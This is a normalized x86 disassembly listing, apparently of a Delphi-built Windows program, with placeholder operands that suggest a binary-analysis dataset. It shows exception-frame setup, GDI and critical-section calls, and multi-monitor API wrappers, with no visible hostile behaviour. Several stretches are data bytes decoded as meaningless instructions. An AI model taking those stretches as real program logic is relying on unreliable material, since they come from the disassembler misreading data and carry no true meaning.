jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4231f0
retn
mov eax [ rw-data ]
call sub_403294
mov eax [ rw-data ]
call sub_403294
mov eax [ rw-data ]
call sub_403294
call sub_420238
mov eax [ rw-data ]
call sub_403294
mov eax [ rw-data ]
call sub_403294
mov eax [ rw-data ]
call sub_403294
mov eax [ rw-data ]
call sub_403294
mov eax [ rw-data ]
call sub_403294
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404acc
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404acc
sub_4231f4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_422cf8
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_422d74
mov cx 0x2c
mov dl 0x1
mov eax [ sub_41cc3c ]
call sub_41ccb0
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41cc3c ]
call sub_41ccb0
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41cc3c ]
call sub_41ccb0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422e40
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4143dc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4143dc
mov [ rw-data ] eax
mov ecx sub_41d508
mov edx sub_41d518
mov eax [ r-xdata ]
call sub_413b38
mov ecx r-xdata
mov edx sub_41d720
mov eax [ r-xdata ]
call sub_413b38
sub_423300
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423325
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42332c
retn
sub_423468
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4234c0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_4143d8
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403294
sub_423504
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_423548
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_42358c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_414060
mov eax esi
pop esi
pop ebx
retn
sub_4235b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4235dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4235e4
retn
sub_4236ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4236d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4236d8
retn
sub_4236e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_4237a3
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4237aa
lea eax [ ebp - 0x4 ]
call sub_404050
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404510
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4236e4
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_404050
sub_4237cc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_4236e4
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_423854
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_4236e4
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_4238e4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_4236e4
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_423854
sub_42397a
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_4236e4
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4239fb
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4236e4
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_423ae8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_4236e4
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_423bbc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_4236e4
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_423c90
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_4236e4
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_423e2b
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_423e51
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e58
retn
sub_423e6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423e91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e98
retn
sub_423ea4
test al 0x3e
inc edx
add [ edi ] cl
or eax 0x6c654849
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
sub al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e98
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
inc eax
inc edx
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0x3f107265
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
call [ edi + edi ]
inc edx
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x112c7265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 2 + 0x42 ] cl
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
outsb
je r-xdata
js r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
aas
outsb
je r-xdata
adc eax 0x65705349
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x423ee0c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0xe0040 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
adc [ edi ] bh
jns r-xdata
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edi + ebp * 2 + 0x40 ] dh
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_424c37
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
push esi
je r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x3f4c7265
inc edx
add [ ecx ] al
xchg bx ax
cld
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45140040 ] al
dec eax
insb
jo r-xdata
inc eax
outsb
je r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x423fccc0 ]
aas
inc edx
add bh bh
dec [ edi + edi + 0x150f0042 ]
dec ecx
push ebx
jo r-xdata
dec edi
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
aas
insd
sub al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x423f50c0 ]
add [ edi ] cl
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_4040a4
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
imul ebp [ edi + 0x6e ] 0xb000408d
inc eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4240 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
inc eax
inc edx
add [ eax + eax ] cl
add [ eax ] al
mov eax 0xc4004010
xor al 0x40
add al dl
xor al 0x40
add ah dl
jae r-xdata
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
jmp r-xdata
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
lea eax [ eax ]
dec esp
inc eax
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x404c0040 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424c3e
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404acc
lea eax [ ebp - 0x8 ]
call sub_40568c
retn
inc ebx
xor edi edi
int3
mov eax eax
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4056d0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_4234a4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4056a4
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4056d0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_424268
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4242de
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_4243f4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4056a4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4242e5
lea eax [ ebp - 0x8 ]
call sub_40568c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_424380
mov [ rw-data ] eax
sub_4242ec
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424380
mov [ rw-data ] eax
mov ecx r-xdata
call sub_4056d0
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_424344
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4056a4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_424380
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov dl 0x1
mov eax [ r-xdata ]
call sub_423468
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423468
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423468
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_404050
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4243f4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4244f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_424344
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4234b8
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_40568c
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d1ac
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_40568c
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d1ac
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424344
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4234b8
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424344
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4234b8
mov ecx r-xdata
call sub_4056d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4244fc
lea eax [ ebp - 0xc ]
call sub_40568c
lea eax [ ebp - 0x8 ]
call sub_40568c
retn
sub edx 0xfffffff8
sub_424514
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_4234a4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_424554
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_4234a4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_424584
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_424716
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_4234a4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4246b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42471d
lea eax [ ebp - 0x10 ]
call sub_404050
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_4234a4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
mov eax esi
xor edx edx
call sub_4234a4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_4234a4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
